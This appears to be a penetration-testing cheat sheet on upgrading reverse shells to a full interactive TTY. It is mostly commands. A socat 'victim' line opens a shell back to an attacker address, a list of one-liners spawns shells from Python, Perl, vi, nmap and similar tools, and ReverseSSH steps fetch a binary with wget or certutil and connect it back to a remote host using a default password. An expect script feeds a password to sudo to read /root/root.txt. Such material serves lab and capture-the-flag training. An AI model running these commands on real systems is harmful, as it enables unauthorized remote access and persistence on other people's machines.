## Full TTY

Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Also, note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.

#### Python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

> [!NOTE]
> You can get the **number** of **rows** and **columns** executing **`stty -a`**

#### script

```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

#### socat

```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

A convenient way for **interactive shell access**, as well as **file transfers** and **port forwarding**, is dropping the statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) onto the target.

Below is an example for `x86` with upx-compressed binaries. For other binaries, check [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Prepare locally to catch the ssh port forwarding request:

```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```

- (2a) Linux target:

```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```

- (2b) Windows 10 target (for earlier versions, check [project readme](https://github.com/Fahrj/reverse-ssh#features)):

```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```

- If the ReverseSSH port forwarding request was successful, you should now be able to log in with the default password `letmeinbrudipls` in the context of the user running `reverse-ssh(.exe)`:

```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```

## Penelope

[Penelope](https://github.com/brightio/penelope) automatically upgrades Linux reverse shells to TTY, handles the terminal size, logs everything and much more. Also it provides readline support for Windows shells.

## No TTY

If for some reason you cannot obtain a full TTY you **still can interact with programs** that expect user input. In the following example, the password is passed to `sudo` to read a file:

```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
